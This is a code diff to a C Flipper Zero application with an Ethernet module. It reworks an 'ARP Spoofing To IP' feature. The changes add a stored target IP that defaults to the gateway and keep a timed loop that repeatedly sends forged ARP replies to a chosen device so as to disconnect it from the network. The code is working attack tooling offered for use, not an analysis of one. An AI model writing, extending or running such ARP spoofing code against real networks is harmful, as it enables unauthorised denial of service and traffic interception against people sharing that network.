@@ -6,6 +6,8 @@ enum {
     SET_IP
 } arp_ip_specific_options;
 
+static uint8_t target_ip[4] = {0};
+
 /**
  * Scene for the menu to select some options in the arp spoofing to an specific IP
  */
@@ -37,15 +39,16 @@ void app_scene_arp_spoofing_specific_ip_menu_on_enter(void* context) {
 
     submenu_reset(app->submenu);
 
+    if(*(uint32_t*)target_ip == 0) memcpy(target_ip, app->ip_gateway, 4);
     furi_string_reset(app->text);
 
     furi_string_printf(
         app->text,
         "Attack IP [%u.%u.%u.%u]",
-        app->ip_helper[0],
-        app->ip_helper[1],
-        app->ip_helper[2],
-        app->ip_helper[3]);
+        target_ip[0],
+        target_ip[1],
+        target_ip[2],
+        target_ip[3]);
 
     submenu_set_header(app->submenu, "ARP Spoofing To IP");
 
@@ -102,7 +105,7 @@ void set_ip_to_spoof(App* app) {
     ip_assigner_reset(app->ip_assigner);
     ip_assigner_set_header(app->ip_assigner, "Set Ip Address to Spoof");
     ip_assigner_callback(app->ip_assigner, set_ip_to_spoof_manually, app);
-    ip_assigner_set_ip_array(app->ip_assigner, app->ip_helper);
+    ip_assigner_set_ip_array(app->ip_assigner, target_ip);
 
     view_dispatcher_switch_to_view(
         app->view_dispatcher, IpAssignerView); // Switch to the input byte view
@@ -166,7 +169,7 @@ void app_scene_arp_spoofing_specific_ip_on_exit(void* context) {
 
     switch(scene_manager_get_scene_state(
         app->scene_manager, app_scene_arp_spoofing_specific_ip_option)) {
-    case 0:
+    case ATTACK_IP:
         finish_spoofing_specific_ip_thread(app);
         break;
 
@@ -178,7 +181,6 @@ void app_scene_arp_spoofing_specific_ip_on_exit(void* context) {
 /**
  * Views or functions to show the IP address
  */
-
 // Function to draw if getting the MAC from IP failed
 void draw_process_failed(App* app) {
     widget_reset(app->widget);
@@ -234,21 +236,17 @@ int32_t thread_for_spoofing_specific_ip(void* context) {
     enc28j60_t* ethernet = app->ethernet;
 
     // frames to send
-    uint8_t buffer_to_gateway[MAX_FRAMELEN] = {0}; // Frame to send to the gateway
     uint8_t buffer_to_ip[MAX_FRAMELEN] = {0}; // Frame to send to the specific IP
     uint16_t size_one = 0;
-    uint16_t size_two = 0;
 
     // Just the addreses for the specific device to disconnect
-    uint8_t* ip_device_to_disconnect = app->ip_helper; // IP address
+    uint8_t* ip_device_to_disconnect = target_ip; // IP address
     uint8_t mac_device_to_disconnect[6] = {0}; // Mac address
 
     // Just an alternative to get the gateway IP
     // (This is unuseful, is not to get the real IP for the mac address ofour flipper)
     uint8_t ip_alternative[4] = {192, 168, 0, 1};
-
-    // for mac handle
-    uint8_t last_mac[6] = {0}; // To save the last mac
+    uint8_t mac_alternative[6] = {1, 1, 1, 1, 1, 2};
 
     // Variable for time
     uint32_t time_out = 0;
@@ -274,68 +272,40 @@ int32_t thread_for_spoofing_specific_ip(void* context) {
         program_loop = false;
     }
 
-    if(program_loop) {
-        // Save last mac
-        memcpy(last_mac, ethernet->mac_address, 6);
-
-        // generate a random mac
-        generate_random_mac(ethernet->mac_address);
-
-        // Set the mac in the chip
-        enc28j60_set_mac(ethernet);
-
-        // Set host name with random number id
-        uint32_t number_altern = furi_hal_random_get();
-        uint8_t number = number_altern;
-
-        furi_string_reset(app->text);
-        furi_string_printf(app->text, "DEVICE%02x", number);
-
-        // Get the ip gateway and then it mac address
-        if(!flipper_process_dora_with_host_name(
-               ethernet,
-               ip_alternative,
-               app->ip_gateway,
-               ethernet->subnet_mask,
-               furi_string_get_cstr(app->text))) {
-            draw_dora_failed(app);
-            goto finalize_arp_spoofing_ip;
-        }
+    if(!app->is_dora) {
+        draw_dora_needed(app);
+        program_loop = false;
     }
 
     // draw the waiting attack
     if(program_loop) {
         // then get mac gateway
-        /*if(!arp_get_specific_mac(ethernet, ip_alternative, app->ip_gateway, app->mac_gateway)) {
+        if(!arp_get_specific_mac(
+               ethernet, ip_alternative, app->ip_gateway, mac_alternative, app->mac_gateway)) {
             draw_process_failed(app);
-            goto finalize_arp_spoofing_ip;
+            //goto finalize_arp_spoofing_ip;
+            program_loop = false;
         }
 
         // get the mac of the device
         if(!arp_get_specific_mac(
-               ethernet, ip_alternative, ip_device_to_disconnect, mac_device_to_disconnect)) {
+               ethernet,
+               ethernet->ip_address, //ip_alternative,
+               ip_device_to_disconnect,
+               ethernet->mac_address, //mac_alternative,
+               mac_device_to_disconnect)) {
             draw_process_failed(app);
-            goto finalize_arp_spoofing_ip;
-        }*/
-
-        // Set the frames or messages to send
-        // 1. Reply to the Gateway
-        arp_set_message_attack(
-            buffer_to_gateway,
-            ip_device_to_disconnect,
-            ethernet->mac_address,
-            app->ip_gateway,
-            app->mac_gateway,
-            &size_one);
+            program_loop = false;
+        }
 
         //2. Reply to the IP of the device
         arp_set_message_attack(
             buffer_to_ip,
             app->ip_gateway,
-            ethernet->mac_address,
+            app->mac_gateway, //mac_alternative,
             ip_device_to_disconnect,
             mac_device_to_disconnect,
-            &size_two);
+            &size_one);
     }
 
     while(furi_hal_gpio_read(&gpio_button_back) && program_loop) {
@@ -359,19 +329,11 @@ int32_t thread_for_spoofing_specific_ip(void* context) {
         if(attack) {
             if((furi_get_tick() - time_out) > 200) {
                 send_packet(ethernet, buffer_to_ip, size_one);
-                send_packet(ethernet, buffer_to_gateway, size_two);
                 time_out = furi_get_tick();
             }
         }
 
         furi_delay_ms(1);
-    }
-
-finalize_arp_spoofing_ip:
-
-    if(start) {
-        memcpy(ethernet->mac_address, last_mac, 6);
-        enc28j60_set_mac(ethernet);
     }
 
     return 0;
